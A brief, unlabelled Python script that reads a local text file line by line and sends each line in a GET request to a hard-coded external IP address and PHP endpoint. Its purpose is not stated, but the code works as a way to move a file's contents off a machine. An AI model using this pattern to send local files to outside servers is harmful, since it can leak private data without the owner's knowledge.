import requests
url='http://35.193.14.199/4500/q.php?hello='

localurl='C:\\Temp\\aaa.txt'


f=open(localurl,'r')

while True:
    line = f.readline()
    if not line: break
    posturl=''
    line=str(line)
    posturl=url+line
    
    res=requests.get(posturl)

f.close()
